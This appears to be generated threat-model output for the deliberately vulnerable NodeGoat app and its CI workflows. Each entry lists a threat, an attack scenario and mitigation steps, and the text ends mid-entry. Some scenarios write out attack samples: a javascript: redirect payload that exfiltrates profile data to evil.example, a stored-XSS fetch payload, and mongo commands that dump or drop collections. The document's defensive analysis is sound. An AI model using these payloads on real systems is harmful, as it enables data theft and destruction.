mitigation.summary: Harden the npm cache so pull-request runs cannot influence trusted builds.
steps: Replace the manual actions/cache step in .github/workflows/e2e-test.yml:25-31 with `actions/setup-node`'s built-in `cache: npm`, which scopes restores to the lockfile.
Include `${{ github.workflow }}` and a cache version prefix in the key so unrelated jobs cannot share entries.
Avoid caching ~/.cache wholesale; limit the cached path to ~/.npm.

threats.title: Unbounded matrix runs on every push and fork pull request consume CI capacity
threats.asset: GitHub Actions runner minutes and CI availability
threats.attackScenario: The e2e-test workflow triggers on `on: [push, pull_request]` (.github/workflows/e2e-test.yml:2) with a three-entry Node matrix and `fail-fast: false`, and declares no `concurrency` group, so an attacker repeatedly force-pushes to a fork pull-request branch and each push spawns three fresh ubuntu-latest jobs that run to completion, exhausting the repository's runner concurrency and delaying legitimate builds.
assumptions: Workflow runs on pull requests from forks are not gated behind maintainer approval for this repository.
threats.impactReason: Availability of CI is degraded and billed minutes are burned, but no data is exposed or altered.
threats.likelihoodReason: Any GitHub user can fork and push repeatedly; no special position is required.

mitigation.summary: Add concurrency cancellation and limit fork triggers.
steps: Add a `concurrency: { group: ${{ github.workflow }}-${{ github.ref }}, cancel-in-progress: true }` block to .github/workflows/e2e-test.yml so superseded runs are cancelled.
Set a `timeout-minutes` on the e2e-test job.
Enable the repository setting requiring approval for workflow runs from first-time or outside contributors.

threats.title: Lint workflow fetches jshint from the npm registry at run time on untrusted pull requests
threats.asset: the lint CI runner and the code it checks out
threats.attackScenario: The lint job at .github/workflows/lint.yml:5 runs `npx --no-install jshint@2.12.0 .` (line 26), which downloads the jshint package and its transitive dependencies from the public npm registry on every push and pull_request with no integrity pinning or lockfile, so an attacker who publishes a malicious version of a jshint dependency gets arbitrary code executed inside the ubuntu-latest runner against the checked-out repository contents.
assumptions: No npm registry proxy or integrity allow-list is enforced for the runner.
jshint is not present in the repository's own dependencies, so `npx` resolves and downloads it from the public registry at job run time.
threats.impactReason: Arbitrary code runs in the lint runner with access to the checked-out source and job environment, though persist-credentials is false which limits repository write.
threats.likelihoodReason: Depends on a compromised or typosquatted package in the jshint dependency tree reaching the registry; the fetch itself happens on every push.

mitigation.summary: Install the linter from the repository lockfile instead of fetching it at run time.
steps: Add jshint@2.12.0 as a devDependency in package.json and commit the resulting package-lock.json.
Change .github/workflows/lint.yml:26 to run `npm ci` followed by `npx --no-install jshint .` so the pinned, integrity-checked lockfile versions are used.
Add `permissions: contents: read` to the workflow.

threats.title: Unpinned third-party actions in the lint workflow allow supply-chain tampering
threats.asset: the lint CI runner environment and checked-out source
threats.attackScenario: The lint job at .github/workflows/lint.yml:5 references actions/checkout@v2 and actions/setup-node@v1 by mutable tag (lines 16 and 21), so an attacker who moves one of those tags to a malicious commit has their code executed inside the runner on the next push, replacing the checked-out source or the Node.js toolchain before `npx jshint` runs.
assumptions: The action tags are mutable and resolved at run time rather than pinned by an organisation policy.
threats.impactReason: Code execution in the runner is possible, but the job holds no deploy secrets and persist-credentials is disabled.
threats.likelihoodReason: Requires compromise of a GitHub-owned action repository or its tag, which is rare.

mitigation.summary: Pin the actions used by the lint workflow to commit SHAs.
steps: Replace `actions/checkout@v2` and `actions/setup-node@v1` in .github/workflows/lint.yml with full 40-character commit SHAs.
Add `permissions: contents: read` at the workflow level.

threats.title: Error responses are returned over cleartext HTTP, exposing the session cookie and leaked internals on the wire
threats.asset: session cookie and internal error details
threats.attackScenario: The errors-to-user flow is declared as plain HTTP across a trust boundary and the express-session cookie configured at server.js:78 has Secure left at the library default of false, so an attacker on the same café or hotel network passively captures the request that triggers the 500 from /research or /profile, lifts the connect.sid cookie from the cleartext header, and replays it to browse the victim's profile page containing SSN and bank account numbers.
assumptions: Assume no TLS termination exists anywhere in the path, so traffic including session cookies and sensitive personal data is transmitted in plaintext.
The application is reachable over plain HTTP in deployment and no TLS-terminating proxy redirects or HSTS policy forces HTTPS.
threats.impactReason: A captured session cookie yields full account takeover including the profile record with SSN, date of birth and bank routing details.
threats.likelihoodReason: Requires the attacker to be positioned on the network path, but no authentication or application flaw is needed once there. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Force HTTPS for all responses and mark the session cookie Secure.
steps: Set cookie: { secure: true, sameSite: 'lax' } on the express-session configuration at server.js:78 and set app.set('trust proxy', 1) if terminating TLS at a proxy.
Add helmet's HSTS middleware and redirect any plain-HTTP request to https before the router chain.
Confirm the 500 path in app/routes/error.js is reached only over TLS in deployment.

threats.title: Error page is served without security response headers, letting injected error text execute in the victim's session
threats.asset: session-scoped actions and profile data (SSN, date of birth, bank account and routing numbers) readable in the victim's logged-in browser
threats.attackScenario: No Content-Security-Policy, X-Frame-Options or X-Content-Type-Options is set anywhere in the Express stack, so an attacker who gets attacker-controlled text into an error message (for example a bad stock symbol echoed back through `{{error}}` in app/views/error-template.html) or who frames the 500 page has no browser-side backstop: the script runs same-origin and issues a POST to /profile as the logged-in victim, overwriting or reading their SSN and bank account fields.
assumptions: No reverse proxy in front of the application injects Content-Security-Policy or frame-ancestors headers.
The template engine's escaping of `{{error}}` does not cover every path by which error text reaches the page.
threats.impactReason: Script running in the victim's authenticated origin can read and submit the profile form carrying SSN, date of birth and bank account/routing numbers; the session cookie itself is HttpOnly and cannot be read by script.
threats.likelihoodReason: Headers are absent application-wide, but the attacker still needs an injection sink or a framing lure to convert the missing defence into execution.

mitigation.summary: Add helmet to the Express app so every response, including the 500 error page, carries a restrictive header set.
steps: Install and mount helmet in the main Express setup before the routers, enabling contentSecurityPolicy with default-src 'self' and no inline script.
Set frameguard to deny so the error and profile pages cannot be framed.
Verify the headers are present on a forced 500 response from app/routes/error.js, since error responses often bypass late middleware.

threats.title: No CSRF token on the state-changing forms whose failures surface through the error middleware
threats.asset: the victim's stored profile record (SSN, date of birth, bank account and routing numbers)
threats.attackScenario: Cookie sessions are used and no CSRF middleware or token is present, and the profile form at app/views/profile.html posts to /profile with only name/ssn/bankAcc fields, so an attacker hosts a page that auto-submits a cross-origin POST /profile with attacker-chosen bank account and routing numbers; the victim's browser attaches the session cookie (SameSite is unset at server.js:78) and the record is overwritten, with any resulting failure merely rendered by app/routes/error.js as a 500.
assumptions: No Origin or Referer check is enforced on POST /profile or POST /memos upstream of the routers.
threats.impactReason: An attacker silently rewrites the victim's banking details and other sensitive profile fields without ever seeing the session cookie.
threats.likelihoodReason: Only requires luring an authenticated user to an attacker-controlled page; the forms and their field names are publicly visible in the shipped templates.

mitigation.summary: Add per-session CSRF tokens to all POST forms and validate them server-side.
steps: Mount a CSRF middleware after the express-session middleware and expose the token to the view layer.
Add a hidden _csrf input to the forms in app/views/profile.html, app/views/memos.html and app/views/login.html.
Set sameSite: 'strict' on the session cookie at server.js:78 as defence in depth.

threats.title: Stack traces and internal error objects rendered into the HTTP 500 page
threats.asset: internal error details and stack traces
threats.attackScenario: The middleware in app/routes/error.js passes the raw `err` object into res.render("error-template", {error: err}) and app/views/error-template.html prints it with `{{error}}`, so an attacker submits a malformed value (for example a crafted `symbol`/`url` pair to GET /research or a bad body to POST /profile) to force a throw and reads the resulting 500 page for file paths, driver messages and query fragments that map the server's internals before a targeted attack.
assumptions: The same error middleware is mounted in production deployments without an environment check that suppresses error detail.
threats.impactReason: Leaked stack frames, absolute paths and database driver messages give an attacker a reliable map of the code and dependency versions, accelerating further exploitation, though no user record is disclosed directly.
threats.likelihoodReason: Any unauthenticated visitor can trigger an exception by sending malformed input to a public route and simply read the response body.

mitigation.summary: Render a generic error page to users and keep the error object server-side.
steps: In app/routes/error.js, log err.message and err.stack via the server logger only, and pass a static message plus a correlation id to res.render instead of the `err` object.
Change the `{{error}}` interpolation in app/views/error-template.html to print only the correlation id and a fixed apology string.
Gate any detailed output behind a NODE_ENV !== 'production' check so development retains the stack trace.

threats.title: Session cookie and credentials sent over plaintext HTTP
threats.asset: session cookies and submitted login credentials
threats.attackScenario: server.js:145 starts the app with http.createServer while the HTTPS block at server.js:149-155 stays commented out and the session cookie at server.js:78 is configured without `secure`, so an attacker on the same network as a user captures the POST /login body and the connect.sid cookie in cleartext and replays the cookie to act as that user on /profile and /allocations.
assumptions: Assume no TLS termination exists anywhere in the path, so traffic including session cookies and sensitive personal data is transmitted in plaintext.
No TLS-terminating reverse proxy is placed in front of the container's exposed port 4000.
threats.impactReason: Captured credentials and session ids give full account takeover, including profile and retirement allocation data.
threats.likelihoodReason: Requires network adjacency to a user, but the container exposes plain HTTP on port 4000 and no cookie secure flag limits transmission. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Serve the application over HTTPS and mark the session cookie Secure and HttpOnly.
steps: Enable the https.createServer block at server.js:149-155 or terminate TLS at a proxy and redirect HTTP to HTTPS.
Set `cookie: { httpOnly: true, secure: true, sameSite: "lax" }` in the express-session options at server.js:78.
Enable helmet.hsts() (already a dependency) once HTTPS is in place.

threats.title: Missing function-level access control on the benefits administration routes
threats.asset: employee benefit start dates
threats.attackScenario: app/routes/index.js:55-56 registers GET and POST /benefits with isLoggedIn only while the isAdmin middleware built at app/routes/index.js:27 is left commented out at lines 57-60, so an ordinary user who signs up simply POSTs to /benefits and rewrites any employee's benefit start date.
assumptions: The benefits handler treats the posted userId as the record to update rather than restricting to the session user.
threats.impactReason: Non-admin users can view and alter benefit data for the whole employee population.
threats.likelihoodReason: The admin check is absent from the route registration and any authenticated account reaches it directly.

mitigation.summary: Add the isAdmin middleware to the benefits routes.
steps: Replace app/routes/index.js:55-56 with the commented variants at lines 58-59 that chain isLoggedIn and isAdmin.
Re-check user.isAdmin inside benefitsHandler.updateBenefits before writing.

threats.title: Open redirect on GET /learn via unvalidated url query parameter
threats.asset: user credentials and session identifiers of NodeGoat users
threats.attackScenario: app/routes/index.js:70-72 passes req.query.url straight into res.redirect with no allow-list, so an attacker emails a logged-in employee a link to https://nodegoat-host/learn?url=https://evil.example/login that renders a cloned NodeGoat login page and harvests the username and password the victim retypes.
threats.impactReason: Phished credentials give full access to a victim's profile, contributions and allocations; the same sink is also the vector for the express redirect XSS CVE.
threats.likelihoodReason: Any logged-in user following a crafted link triggers it; the parameter is fully attacker-controlled and needs no special position.

mitigation.summary: Validate the redirect target against an allow-list before calling res.redirect.
steps: In app/routes/index.js:70, compare req.query.url against a fixed map of permitted learning-resource URLs and redirect to a default page when it does not match.
Reject absolute URLs whose host is not in the allow-list rather than passing raw input to res.redirect.
Upgrade express to >=4.20.0 in package.json to pick up the fixes for CVE-2024-29041 and CVE-2024-43796.

threats.title: Template auto-escaping disabled application-wide enables stored XSS
threats.asset: session-authenticated actions and page content of other NodeGoat users
threats.attackScenario: server.js:135-142 calls swig.setDefaults({ autoescape: false }) for the consolidate/Swig engine registered at server.js:116, so an attacker saves a first name or memo containing <script>fetch('/profile',{method:'POST',body:...})</script> and the payload executes in every viewer's logged-in session, submitting same-origin profile and memo changes as the victim.
assumptions: At least one view renders user-supplied fields such as profile names or memos without an explicit escape filter.
threats.impactReason: Script runs in any viewer's session and can drive state-changing same-origin requests such as POST /profile and POST /memos; the session cookie itself is HttpOnly by default.
threats.likelihoodReason: Auto-escaping is globally off and the application stores and re-renders user-supplied profile and memo text.

mitigation.summary: Re-enable Swig auto-escaping and add a content security policy.
steps: Set `autoescape: true` in swig.setDefaults at server.js:135.
Uncomment app.use(helmet.contentSecurityPolicy()) and the other helmet middleware at server.js:38-65 so a restrictive CSP and nosniff header are sent.
Audit templates for `|safe` filters applied to user-controlled values.

threats.title: Any logged-in user can read another user's retirement allocations via GET /allocations/:userId
threats.asset: other users' retirement allocation records
threats.attackScenario: app/routes/index.js:63 guards GET /allocations/:userId with isLoggedIn only and performs no ownership check, so an attacker signs up through POST /signup, notes their numeric userId, then requests /allocations/1, /allocations/2 and so on to read every other employee's stock, fund and bond allocations.
assumptions: The allocations handler queries by the :userId path parameter rather than by the session user id.
The allocations handler uses the :userId path parameter rather than req.session.userId to look up the record.
User ids are sequential small integers.
threats.impactReason: The full allocations table becomes readable one id at a time by any registered account.
threats.likelihoodReason: User ids are sequential integers from the counters collection and any self-registered account reaches the route.

mitigation.summary: Scope the allocations lookup to the session user or enforce an admin role.
steps: In app/routes/index.js:63 compare req.params.userId with req.session.userId and return 404 on mismatch, or add the existing isAdmin middleware for cross-user access.
Apply the same ownership check inside allocationsHandler.displayAllocations so the control is not route-only.

threats.title: Denial of service through the vulnerable body-parser urlencoded parser
threats.asset: availability of the NodeGoat application on port 4000
threats.attackScenario: server.js:72-75 enables bodyParser.urlencoded on a body-parser version affected by CVE-2024-45590, so an unauthenticated attacker repeatedly POSTs crafted urlencoded bodies to /login and pins the single Node process's event loop, making the app unreachable for all users.
assumptions: No request-size or rate limit is applied in front of the Express process.
threats.impactReason: The whole single-process application becomes unresponsive; forever restarts only after the process dies.
threats.likelihoodReason: POST /login is unauthenticated and parses urlencoded bodies, but the attack needs sustained crafted traffic.

mitigation.summary: Upgrade body-parser and cap request bodies.
steps: Pin body-parser to >=1.20.3 (or upgrade express to >=4.20.0, which bundles it) in package.json.
Pass a `limit` option to bodyParser.json() and bodyParser.urlencoded() in server.js:71-75.
Add per-IP rate limiting in front of POST /login.

threats.title: CI workflow runs on untrusted pull_request events and executes repository-controlled npm scripts
threats.asset: the build pipeline runner and the cached npm/cypress directories
threats.attackScenario: The e2e-test workflow triggers on `pull_request` (.github/workflows/e2e-test.yml:2), checks out the head ref and then runs `npm ci`, `npm run cy:verify` and `npm start` from the checked-out tree, so an outside contributor opens a pull request that adds a malicious `prepare`/`postinstall` script or edits the `start` script in package.json and gains arbitrary code execution on the ubuntu-latest runner, where it can poison the actions/cache entry keyed on package-lock.json for later builds.
assumptions: No branch protection or required-approval gate prevents the e2e-test job from executing fork-supplied package scripts.
The repository allows workflows to run automatically on pull requests from forks without maintainer approval.
threats.impactReason: Arbitrary code runs in the CI runner and can write cache entries consumed by subsequent trusted builds, tainting test artifacts and the build pipeline.
threats.likelihoodReason: Opening a pull request is free, though persist-credentials:false and the absence of secrets in these jobs limit what an attacker immediately gains.

mitigation.summary: Prevent fork pull requests from executing repository-controlled install and start scripts unreviewed.
steps: Require maintainer approval for workflow runs from fork pull requests in the repository's Actions settings.
Run `npm ci --ignore-scripts` in the Install dependencies step of .github/workflows/e2e-test.yml before invoking cypress.
Scope the actions/cache key so pull_request runs read but do not write the shared cache.

threats.title: Unpinned and outdated CI actions allow tampering with the GitHub Actions CI pipeline
threats.asset: the build pipeline and uploaded cypress test artifacts
threats.attackScenario: Both workflows reference third-party actions by floating major tag — actions/checkout@v2, actions/setup-node@v1, actions/cache@v2, actions/upload-artifact@v2 — and the lint job fetches `jshint@2.12.0` from the network at run time (.github/workflows/lint.yml:26), so an attacker who compromises one of those tags or the npm package publishes code that runs inside every push and pull_request job and rewrites the test artifacts the job uploads.
assumptions: Supply-chain compromise of a referenced action tag or of the jshint npm package is within the threat model for this pipeline.
threats.impactReason: Compromised action code executes in every CI run and can falsify lint and end-to-end results as well as the uploaded cypress artifacts.
threats.likelihoodReason: Requires compromise of a widely watched upstream action or npm package, which is uncommon but has precedent.

mitigation.summary: Pin every third-party action and CI tool to an immutable digest or lockfile-resolved version.
steps: Replace the @v1/@v2 tags in .github/workflows/e2e-test.yml and .github/workflows/lint.yml with full commit SHAs.
Add jshint to devDependencies and invoke it via `npx --no-install` against the lockfile-resolved copy rather than fetching jshint@2.12.0 at run time.
Enable Dependabot for GitHub Actions so pinned SHAs are updated deliberately.

threats.title: Open redirect on GET /learn sends authenticated users to attacker-controlled sites
threats.asset: user trust in application-hosted links (and credentials phished via the redirect target)
threats.attackScenario: app/routes/index.js:72 passes req.query.url straight to res.redirect with no allow-list, so an attacker mails a logged-in user a link to https://app/learn?url=https://evil.example/login that the browser follows into a cloned login page, where the victim re-enters their NodeGoat username and password believing the origin was trusted.
threats.impactReason: The redirect launders phishing and malware links through a trusted origin, enabling credential capture, though the application's own data is not directly read.
threats.likelihoodReason: A single crafted URL is enough; any logged-in user clicking it is redirected, and the parameter is fully attacker-controlled.

mitigation.summary: Restrict /learn to an allow-list of redirect targets.
steps: In app/routes/index.js:70-73 compare req.query.url against a fixed map of permitted learning-resource URLs and redirect only to the matched entry.
Reject or fall back to /dashboard for any value not in the map, and never pass raw user input to res.redirect.
If external hosts must be supported, parse the URL and verify the hostname is on an explicit allow-list before redirecting.

threats.title: 302 redirect response from /learn carries no security headers and travels over plain HTTP
threats.asset: session cookie and the redirect target shown to the user
threats.attackScenario: The Learn Redirect Endpoint -> End User flow returns a 302 with no HSTS, no CSP and no frame protection, so an attacker on the same network as the victim intercepts the cleartext GET /learn?url=... exchange, rewrites the Location header to their own host and reads the express-session cookie (Secure not set) from the same plaintext request, taking over the victim's session.
assumptions: Assume no TLS termination exists anywhere in the path, so traffic including session cookies and sensitive personal data is transmitted in plaintext.
The application is served over http as configured, with no TLS-terminating proxy in front of it.
threats.impactReason: A captured session cookie gives full access to the victim's profile, allocations and memos, including SSN and bank account numbers.
threats.likelihoodReason: Requires a network position such as shared Wi-Fi, but no application-level authentication, and the cookie is sent on every request without the Secure flag. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Serve the application over HTTPS and add security response headers.
steps: Uncomment and use the https.createServer block in server.js:152 so the app is served over TLS instead of http.createServer at server.js:145.
Re-enable helmet in server.js (require at line 10, app.use(helmet.hsts()) and helmet.contentSecurityPolicy()) so redirect responses carry HSTS and CSP.
Set cookie: { httpOnly: true, secure: true, sameSite: 'lax' } on the express-session options at server.js:78.

threats.title: Unvalidated url parameter on GET /learn allows non-http scheme redirects
threats.asset: user trust in application-hosted links
threats.attackScenario: The /learn handler at app/routes/index.js:70 reads req.query.url without any validation library or scheme check, so an attacker supplies /learn?url=javascript:fetch('/profile').then(r=>r.text()).then(t=>fetch('https://evil.example?d='+t)) or a data: URL and, on browsers that follow such Location values, script executes in the victim's authenticated session and reads their profile page containing SSN and bank account numbers.
assumptions: No upstream middleware normalises or scheme-checks req.query.url before the handler runs.
The victim's browser follows the non-http scheme supplied in the Location header.
threats.impactReason: Script running in the victim's session can read /profile and /allocations responses that carry SSN, date of birth and bank details.
threats.likelihoodReason: Requires a logged-in victim to click the link and a browser that honours the non-http scheme in a redirect; modern browsers block most of these.

mitigation.summary: Validate the scheme and shape of the url parameter before redirecting.
steps: Parse req.query.url with the Node URL class in app/routes/index.js:70 and reject anything whose protocol is not https:.
Prefer a fixed lookup table of learning-resource links keyed by a short identifier instead of accepting a full URL.

threats.title: Cross-site request forgery lets any site post memos as a logged-in victim
threats.asset: memo content shared between all users
threats.attackScenario: With no CSRF token on the /memos form or middleware in the request pipeline, an attacker hosts a page that auto-submits a hidden form to POST /memos with a memo field; a logged-in NodeGoat user who visits it has their session cookie attached by the browser and a memo (including an XSS payload rendered by marked) is written into the shared memos collection under their identity.
assumptions: No CSRF token is validated for POST /memos anywhere upstream of the handler.
Session cookies are sent on cross-site POSTs because no SameSite attribute is configured.
threats.impactReason: Attacker-chosen content enters the shared memo feed attributed to a victim, and combines with the stored XSS path.
threats.likelihoodReason: The form is a plain unauthenticated-shape POST and requires only that a logged-in user visits an attacker page.

mitigation.summary: Enable CSRF token validation for state-changing routes including POST /memos.
steps: Uncomment and enable the csurf middleware already present at server.js:7 and server.js:107.
Emit res.locals.csrftoken as a hidden input in the form in app/views/memos.html.
Set the session cookie SameSite attribute to 'lax' in the express-session options at server.js:78.

threats.title: MongoDB wire protocol between the app and the nodegoat database is unauthenticated and unencrypted
threats.asset: plaintext user passwords, SSN and bank details stored in the users collection
threats.attackScenario: The connection string at config/env/all.js:3 and docker-compose.yml:8 is mongodb://mongo:27017/nodegoat with no credentials and no tls option, so anyone who reaches the container network can connect to port 27017 as an anonymous client, read the users collection containing plaintext passwords and bank details, or sniff and modify the memos insert/find traffic on the wire.
assumptions: An attacker can reach the mongo service's network, for example from another container or a compromised host process.
Assume MongoDB authentication is not enabled and the app connects with full, unrestricted access as shown in docker-compose.yml.
The MongoDB deployment accepts unauthenticated connections because no user or password is supplied in the URI and no TLS option is set on MongoClient.connect at server.js:30.
threats.impactReason: Direct database access exposes plaintext passwords, SSNs and bank routing details for every user and allows arbitrary tampering with memos and balances.
threats.likelihoodReason: Requires network position on the docker network or host, but no credential is needed once there. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Require authentication and TLS on the MongoDB connection.
steps: Enable MongoDB authentication and put a per-service user and password into MONGODB_URI in docker-compose.yml instead of the credential-free URI.
Pass tls/ssl options to MongoClient.connect at server.js:30 and enable TLS on the mongo service.
Remove the hardcoded fallback mongodb://localhost:27017/nodegoat default at config/env/all.js:3 so a missing env var fails closed.

threats.title: Missing security response headers remove the last defence against the memos XSS payload
threats.asset: memo content shared between all users and the browser sessions viewing /memos
threats.attackScenario: helmet is commented out at server.js:10 and no Content-Security-Policy, X-Frame-Options or X-Content-Type-Options header is sent, so a script injected through a memo and rendered by marked() in app/views/memos.html executes with no CSP to block inline script, and the /memos page can additionally be framed by an attacker site for clickjacking of the memo form.
assumptions: No reverse proxy in front of the Express app adds Content-Security-Policy or X-Frame-Options headers.
threats.impactReason: Absent CSP turns any markdown sanitiser bypass into fully executing script on the shared memos page.
threats.likelihoodReason: Every response from the app lacks the headers and the memos page is reachable by all users.

mitigation.summary: Enable helmet with a content security policy and frame protection.
steps: Uncomment the helmet require at server.js:10 and add app.use(helmet()) before the routes are registered at server.js:132.
Configure a Content-Security-Policy that forbids inline script so injected memo markup cannot execute.
Add app.disable("x-powered-by") and nosniff as sketched at server.js:42-64.

threats.title: Stored XSS in shared memos via marked 0.3.5 sanitizer bypass with swig autoescape disabled
threats.asset: memo content shared between all users and the sessions of every user who views /memos
threats.attackScenario: An attacker posts a memo to POST /memos whose body uses an HTML-entity encoded or data: URI payload (the bypasses of CVE-2016-10531 and CVE-2017-1000427 in marked@0.3.5); memos-dao.js stores it verbatim in the memos collection and app/views/memos.html renders it with {{ marked(doc.memo) }} while swig autoescape is disabled at server.js:137, so the script executes in the browser of every other user who loads GET /memos and can issue same-origin requests such as POST /profile as that victim.
assumptions: The marked.setOptions({sanitize:true}) call at server.js:126 is the only output sanitisation applied to memo content.
threats.impactReason: Every user who loads /memos executes attacker script in their logged-in session, allowing profile SSN/bank field changes and reading of pages the victim can see.
threats.likelihoodReason: Any logged-in user can submit a memo through the textarea on /memos and the known marked sanitizer bypasses are publicly documented.

mitigation.summary: Upgrade marked and stop rendering untrusted markdown as raw HTML.
steps: Upgrade marked in package.json from 0.3.5 to a version >= 4.0.10 and drop the removed sanitize option.
Sanitise the HTML produced by marked(doc.memo) with a dedicated sanitiser (e.g. DOMPurify) before it reaches the template.
Re-enable swig autoescape by setting autoescape: true in server.js:135 and escape memo content explicitly where markdown rendering is intended.

threats.title: No audit trail for memos posted to the shared feed
threats.asset: attribution of memo content shared between all users
threats.attackScenario: MemosHandler.addMemos at app/routes/memos.js:13 passes only req.body.memo to memosDAO.insert and memos-dao.js stores only {memo, timestamp}, so the session's userId is never recorded; an attacker who posts an abusive or XSS-bearing memo can deny authorship and responders cannot tell which account submitted it.
assumptions: No separate access log correlating session identity with POST /memos bodies is retained.
threats.impactReason: Malicious memos cannot be attributed to an account, blocking containment and takedown of the injecting user.
threats.likelihoodReason: Every memo insert silently drops the author, so the gap is exercised on normal use.

mitigation.summary: Record the authoring user on every memo insert.
steps: Pass req.session.userId into memosDAO.insert from app/routes/memos.js:13.
Store userId alongside memo and timestamp in the memos document in app/data/memos-dao.js:18.
Log the userId, timestamp and memo id for each POST /memos at the handler.

threats.title: Loss of the MongoDB link takes down memo reads and writes with no degradation path
threats.asset: availability of the memos read and write path
threats.attackScenario: An attacker who can exhaust MongoDB connections on the mongo service (for example by opening many unauthenticated connections to port 27017 on the container network) makes memosCol.insert and memosCol.find on the memos-to-mongo flow fail; app/routes/memos.js passes the error straight to next(err) with no retry, timeout or fallback, so GET and POST /memos return errors for every user.
assumptions: Assume MongoDB authentication is not enabled and the app connects with full, unrestricted access as shown in docker-compose.yml.
MongoDB accepts connections from the container network without authentication, allowing an attacker to consume its connection pool.
No connection pooling limits, retries or circuit breaker are configured on MongoClient.connect at server.js:30.
threats.impactReason: The memos feature is entirely unavailable while the database link is saturated.
threats.likelihoodReason: Requires network access to the mongo service, which is only exposed inside the compose network. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Harden the database connection against exhaustion and fail gracefully.
steps: Configure poolSize, serverSelectionTimeoutMS and retry options on MongoClient.connect at server.js:30.
Restrict MongoDB to authenticated clients so anonymous connections cannot consume the pool.
Return a cached or empty memos view instead of propagating the raw error in app/routes/memos.js:26.

threats.title: Regex denial of service on GET /memos through marked 0.3.5 inefficient regular expression
threats.asset: availability of the memos page and the Express event loop
threats.attackScenario: An attacker submits a memo to POST /memos containing the pathological markdown input described by CVE-2022-21681 in marked@0.3.5; because every subsequent GET /memos renders the stored memo through marked(doc.memo) in app/views/memos.html, each page load pins the single Node event loop and the whole application becomes unresponsive for all users.
assumptions: Memo length is not bounded before it is stored or rendered.
threats.impactReason: One crafted memo degrades or stalls the single-threaded server for every user, and it is re-triggered on each render.
threats.likelihoodReason: Posting a memo requires only reaching POST /memos and the vulnerable version is pinned in package.json.

mitigation.summary: Upgrade marked past 4.0.10 and cap memo size.
steps: Bump marked to >= 4.0.10 in package.json.
Reject memo bodies over a fixed length in MemosHandler.addMemos at app/routes/memos.js:11 before calling memosDAO.insert.
Render markdown once at write time and cache the HTML instead of re-running marked on every GET /memos.

threats.title: Unauthenticated memo posting and unbounded memo growth flood the shared memos feed
threats.asset: availability of the memos feed and MongoDB storage
threats.attackScenario: An attacker repeatedly calls POST /memos with large bodies; MemosHandler.addMemos inserts each one with no rate limit or size cap and then calls displayMemos, which runs memosCol.find({}) over the entire growing collection on every request, so the memos page and the MongoDB instance slow to a halt for all users.
assumptions: No rate limiting or body-size cap is applied in front of POST /memos.
The memos collection is read in full with no pagination limit.
threats.impactReason: Unbounded growth of the memos collection degrades every /memos render and consumes database storage.
threats.likelihoodReason: The endpoint takes a simple form POST and can be scripted in a loop with no throttle in place.

mitigation.summary: Rate limit memo creation and paginate memo retrieval.
steps: Add per-session rate limiting to the POST /memos route registered at app/routes/index.js:67.
Enforce a maximum memo length in MemosHandler.addMemos before calling memosDAO.insert.
Add .limit() and pagination to memosCol.find({}) in app/data/memos-dao.js:28.

threats.title: Missing CSRF token on the memo form lets attackers post memos as any logged-in user
threats.asset: memo content shared between all users
threats.attackScenario: Because csurf is commented out in server.js and app/views/memos.html renders the memo form at line 15 with no csrftoken hidden field, an attacker hosts a page that auto-submits a form to POST /memos; any logged-in RetireEasy user who visits it silently stores attacker-chosen memo text (including markdown/HTML payloads) that is then rendered to every other user at app/views/memos.html:31.
assumptions: The session cookie is sent on cross-site form POSTs because no SameSite attribute is configured for the express-session cookie.
threats.impactReason: Attacker-controlled content is injected into a board every user reads, which chains into the stored-XSS path on the same page.
threats.likelihoodReason: The memo form requires only a session cookie and no token, and any logged-in user visiting an attacker page triggers it.

mitigation.summary: Restore CSRF tokens on state-changing form posts including /memos.
steps: Uncomment the csurf middleware and the res.locals.csrftoken wiring in server.js lines 104-113.
Add `<input type="hidden" name="_csrf" value="{{csrftoken}}">` to the memo form in app/views/memos.html.
Set the session cookie SameSite attribute to 'lax' or 'strict' in the session options at server.js:78.

threats.title: Missing Content-Security-Policy lets memo-borne script run unrestricted on the memos page
threats.asset: rendered user data on /memos and the victim's authenticated session actions
threats.attackScenario: With helmet and any CSP left commented out in server.js, the rendered memos page carries no script-src or frame-ancestors restriction, so an attacker who lands markup in a memo can load an external script from their own host and exfiltrate the page content (including userId and other users' memos) to that host, and can also frame /memos for clickjacking.
assumptions: The application is deployed without a reverse proxy or CDN that injects Content-Security-Policy and X-Frame-Options headers.
threats.impactReason: No browser-side containment remains once markup reaches the memos page, so injected script has full origin privileges and can exfiltrate rendered data.
threats.likelihoodReason: The memos page is reachable by any logged-in user and the memo field already renders markdown-derived HTML.

mitigation.summary: Enable helmet with a restrictive Content-Security-Policy for the rendered views.
steps: Uncomment and update the helmet require and middleware in server.js (lines 10 and 38-65) using a maintained helmet version.
Configure contentSecurityPolicy with script-src 'self' and frame-ancestors 'none' so memo-derived markup cannot load or execute external script.
Verify the headers are present on GET /memos responses.

threats.title: MongoDB connection string carries no credentials or TLS, allowing unauthenticated access to the nodegoat database
threats.asset: the users collection containing plaintext passwords, SSN and bank details
threats.attackScenario: config/env/all.js:3 and docker-compose.yml:8 set the connection string to mongodb://localhost:27017/nodegoat and mongodb://mongo:27017/nodegoat with no username, password or tls option, so anyone who reaches the mongod port on the deployment network connects with the shell and runs db.users.find() to read every password, SSN and bank account, or db.memos.drop() to destroy data with no per-user attribution in the database.
assumptions: Assume MongoDB authentication is not enabled and the app connects with full, unrestricted access as shown in docker-compose.yml.
The MongoDB port is reachable from at least one other host or container in the deployment environment.
The mongod instance is started without authentication enabled, as the credential-free connection strings in config/env/all.js and docker-compose.yml imply.
threats.impactReason: Direct database access yields every sensitive field in the application, including plaintext passwords, and permits undetected modification or deletion of collections.
threats.likelihoodReason: Exploitation requires network reach to port 27017, which the compose file restricts with `expose`, but no authentication stands in the way once reached. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Require authentication and TLS on the MongoDB connection.
steps: Create a least-privilege MongoDB user for the nodegoat database and put its credentials in MONGODB_URI rather than defaulting to an anonymous URI in config/env/all.js:3.
Enable authorization in the mongo service in docker-compose.yml and start mongod with --auth and TLS.
Add the tls option to MongoClient.connect in server.js:30 so traffic to the database is encrypted.

threats.title: Server-side JavaScript injection through the allocations threshold reaches MongoDB $where
threats.asset: allocations, and via $where evaluation the users collection holding plaintext passwords, SSN and bank details
